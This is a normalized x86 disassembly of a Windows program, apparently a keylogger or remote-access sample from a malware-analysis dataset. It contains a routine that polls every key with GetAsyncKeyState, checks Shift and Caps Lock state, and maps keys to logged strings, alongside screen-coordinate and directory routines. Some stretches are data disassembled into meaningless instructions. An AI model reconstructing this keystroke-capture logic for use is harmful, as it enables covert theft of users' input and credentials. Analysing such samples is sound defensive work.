push [ ebp - 0x4 ]
push r-xdata
mov eax ebx
mov edx 0x4
call sub_3a65634
mov eax [ ebx ]
call sub_3a69df0
test al al
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_3a6556c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aecda2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
push 0x0
mov eax [ ebx ]
call sub_3a65730
push eax
call CreateDirectoryA
sub_3aece15
out 0xae al
add eax [ edi ]
push esp
push edx
insd
outsd
je r-xdata
add esp esp
cmp ch [ eax - 0x5340fffd ]
add ecx eax
pop ebx
lodsb [ esi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax + 0x6403ab7d ]
imul ebp [ ebx + eax + sub_3ab7a0c ] 0xffffffa8
jmp r-xdata
insb
into
scasb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x31 ] dh
scasb [ edi ]
add eax [ eax - 0x2f ]
scasb [ edi ]
add eax [ edx + 0x803aecf ]
shr [ esi + 0x3 ] 0x1
add [ ecx + edx * 8 ] dl
scasb [ edi ]
add ebx [ ebx + eax + 0x2a140000 ]
lodsb [ esi ]
add esi eax
cmp eax 0x5d5403a8
lodsb [ esi ]
add ebx [ eax + 0x5f ]
lodsb [ esi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax - 0x6b ]
lodsb [ esi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax eax
pop edi
lodsb [ esi ]
add ebx [ eax - 0x73fc5478 ]
lodsb [ esi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add edi [ eax + 0x1c03ac61 ]
bound ebp [ ebx + eax + sub_3ac6358 ]
jo r-xdata
inc ebx
add ebx [ eax + 0x63 ]
lodsb [ esi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
xor [ edi - 0x54 ] ch
sub_3aed164
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
test ebx ebx
je r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3aed23e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a7d3b8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_3a62ee0
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_3a7cdc8
lea eax [ ebp - 0x1c ]
push eax
push 0x0
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_3ae568c
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax ebx
call sub_3a7d3a0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3a7d3b8
mov [ ebp - 0x1 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a64380
mov eax [ ebp - 0xc ]
call sub_3a64380
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_3a62efc
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_3a62efc
retn
sub_3aed250
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_3aed36d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x276 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aed374
lea eax [ ebp - 0x1c ]
mov edx 0x6
call sub_3a652c4
retn
mov eax [ ebx + 0x364 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
je r-xdata
mov eax esi
imul [ ebx + 0x390 ]
mov ecx [ ebx + 0x370 ]
cdq
idiv [ ecx + 0x48 ]
mov esi eax
mov eax edi
imul [ ebx + 0x394 ]
cdq
idiv [ ecx + 0x4c ]
mov edi eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push r-xdata
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_3a6986c
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x1c ]
mov eax edi
call sub_3a6986c
push [ ebp - 0x1c ]
push r-xdata
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_3a65634
mov edx [ ebp - 0x14 ]
mov eax [ ebx + 0x384 ]
call sub_3ae35c4
push r-xdata
lea edx [ ebp - 0xc ]
mov eax esi
call sub_3a6986c
push [ ebp - 0xc ]
push r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_3a6986c
push [ ebp - 0x10 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x5
call sub_3a65634
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x384 ]
call sub_3ae35c4
jmp r-xdata
sub_3aed3c0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_3aed4dd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x276 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aed4e4
lea eax [ ebp - 0x1c ]
mov edx 0x6
call sub_3a652c4
retn
mov eax [ ebx + 0x364 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
je r-xdata
mov eax esi
imul [ ebx + 0x390 ]
mov ecx [ ebx + 0x370 ]
cdq
idiv [ ecx + 0x48 ]
mov esi eax
mov eax edi
imul [ ebx + 0x394 ]
cdq
idiv [ ecx + 0x4c ]
mov edi eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push r-xdata
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_3a6986c
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x1c ]
mov eax edi
call sub_3a6986c
push [ ebp - 0x1c ]
push r-xdata
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_3a65634
mov edx [ ebp - 0x14 ]
mov eax [ ebx + 0x384 ]
call sub_3ae35c4
push r-xdata
lea edx [ ebp - 0xc ]
mov eax esi
call sub_3a6986c
push [ ebp - 0xc ]
push r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_3a6986c
push [ ebp - 0x10 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x5
call sub_3a65634
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x384 ]
call sub_3ae35c4
jmp r-xdata
sub_3aed530
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_3aed5ee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x276 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aed5f5
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_3a652c4
retn
mov eax [ ebx + 0x364 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
je r-xdata
mov eax esi
imul [ ebx + 0x390 ]
mov ecx [ ebx + 0x370 ]
cdq
idiv [ ecx + 0x48 ]
mov esi eax
mov eax edi
imul [ ebx + 0x394 ]
cdq
idiv [ ecx + 0x4c ]
mov edi eax
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_3a6986c
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0xc ]
mov eax edi
call sub_3a6986c
push [ ebp - 0xc ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x384 ]
call sub_3ae35c4
sub_3aed829
scasb [ edi ]
add edx [ ebx ]
fisubr [ esi - 0x5121b6fd ]
add edi [ edi - 0x22 ]
scasb [ edi ]
add esi [ ebp - 0x14fc5122 ]
fisubr [ esi - 0x5120e4fd ]
add ecx [ ebx - 0x21 ]
scasb [ edi ]
add ecx [ ebx + 0x38886 ]
add [ edx + r-xdata ] bh
inc ebx
cmp bl 0xdf
jne r-xdata
movzx edi bl
push edi
call GetAsyncKeyState
cmp ax 0x8001
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
movzx eax bl
add eax 0xfffffff8
cmp eax 0xd6
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aedfc0
lea eax [ ebp - 0x2c ]
mov edx 0xb
call sub_3a652c4
retn
movzx eax [ eax + lookup_table_3aed6b8 ]
jmp [ eax * 4 + jump_table_3aed78f ]
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x14
call GetKeyState
cmp ax 0x1
jne r-xdata
lea edx [ ebp - 0x24 ]
mov eax edi
sub eax 0x60
call sub_3a6986c
mov edx [ ebp - 0x24 ]
mov eax [ esi + 0x388 ]
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
push r-xdata
lea edx [ ebp - 0x2c ]
mov eax edi
sub eax 0x6f
call sub_3a6986c
push [ ebp - 0x2c ]
push r-xdata
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x28 ]
mov eax [ esi + 0x388 ]
call sub_3ae35c4
jmp r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x10
call GetKeyState
test ax ax
jge r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
mov eax [ esi + 0x388 ]
mov edx r-xdata
call sub_3ae35c4
jmp r-xdata
lea eax [ ebp - 0x20 ]
mov edx ebx
call sub_3a65488
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_3a69270
mov edx [ ebp - 0x1c ]
mov eax [ esi + 0x388 ]
call sub_3ae35c4
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov edx ebx
call sub_3a65488
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
call sub_3a691e8
mov edx [ ebp - 0x14 ]
mov eax [ esi + 0x388 ]
call sub_3ae35c4
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_3a65488
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_3a691e8
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x388 ]
call sub_3ae35c4
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_3a65488
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_3a69270
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x388 ]
call sub_3ae35c4
jmp r-xdata
sub_3aee2dc
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3aee430
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_3a6b514
fstp [ ebp - 0x18 ]
fwait
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x8 ]
call sub_3a6c124
call sub_3a6b540
fstp [ ebp - 0x20 ]
fwait
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0xc ]
call sub_3a6c124
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a6e734
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
call sub_3a65338
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a6e734
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x4 ]
call sub_3a65338
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a6e734
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_3a65338
mov eax [ ebx + 0x370 ]
mov eax [ eax + 0x198 ]
call sub_3a8c248
push eax
push [ ebx + 0x398 ]
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
lea eax [ ebp - 0x30 ]
mov edx 0x4
call sub_3a65634
mov edx [ ebp - 0x30 ]
pop eax
mov ecx [ eax ]
call [ ecx + 0x50 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aee437
lea eax [ ebp - 0x30 ]
mov edx 0x4
call sub_3a652c4
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_3a652c4
retn
sub_3aee4a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3aee52b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x368 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aee532
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
push r-xdata
mov esi [ ebx + 0x384 ]
mov eax esi
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x8 ]
call sub_3a69958
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3ae35c4
sub_3aee628
push ebx
push esi
push ecx
mov ebx eax
mov eax [ ebx + 0x36c ]
mov eax [ eax + 0x48 ]
mov esi [ ebx + 0x370 ]
sub eax [ esi + 0x48 ]
mov [ esp ] eax
fild [ esp ]
fdiv [ r-xdata ]
call sub_3a63424
mov edx eax
mov eax esi
call sub_3aaf210
mov eax [ ebx + 0x36c ]
mov eax [ eax + 0x4c ]
mov esi [ ebx + 0x370 ]
sub eax [ esi + 0x4c ]
mov [ esp ] eax
fild [ esp ]
fdiv [ r-xdata ]
call sub_3a63424
mov edx eax
mov eax esi
call sub_3aaf244
pop edx
pop esi
pop ebx
retn
sub_3aee6cc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3aeebb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x278 ]
call sub_3adab94
mov edi eax
dec edi
test edi edi
jl r-xdata
cmp [ ebx + 0xd ] 0x0
jne r-xdata
inc edi
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aeebb7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
mov eax [ ebx + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc esi
dec edi
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x278 ]
mov edx esi
call sub_3adabcc
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x40 ]
call sub_3ae3ae0
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x278 ]
mov edx esi
call sub_3adabcc
mov eax [ eax + 0x8 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
jmp r-xdata
push 0xa
call Sleep
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x40 ]
call sub_3ae3aec
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a6556c
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
cmp esi [ ebp - 0x24 ]
jl r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xa
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov eax [ ebp - 0x8 ]
call sub_3a699d8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x380 ]
mov edx [ ebp - 0x24 ]
call sub_3ad969c
lea eax [ ebp - 0x8 ]
call sub_3a652a0
mov edx r-xdata
mov eax [ ebx + 0x40 ]
call sub_3ae35c4
jmp r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_3a65744#2
mov edx eax
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov esi [ eax ]
call [ esi + 0x10 ]
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
call sub_3a7cbbc
mov eax [ ebp - 0x1c ]
call sub_3a7d3a0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x380 ]
mov edx [ ebp - 0x24 ]
call sub_3ad96ac
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
call sub_3a7d3b8
mov eax [ ebp - 0x1c ]
call sub_3aed164
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
call sub_3a7cbbc
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
call sub_3a7d3a0
mov eax [ ebp - 0x14 ]
call sub_3a7d3a0
push 0x0
push 0x0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_3a7ce38
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_3aeb960
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
je r-xdata
cmp eax 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
call sub_3a7d3a0
mov eax [ ebp - 0x20 ]
call sub_3a7d3a0
mov eax [ ebp - 0x14 ]
call sub_3a7d3a0
mov eax [ ebp - 0x18 ]
call sub_3a7d3a0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x198 ]
call sub_3a8c248
mov edx [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
push 0x0
push 0x0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_3a7ce38
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_3a7cbbc
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x198 ]
call sub_3a8c248
mov edx [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x48 ]
add eax 0x1e
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
pop edx
call sub_3aaf278
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x4c ]
add eax 0x64
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
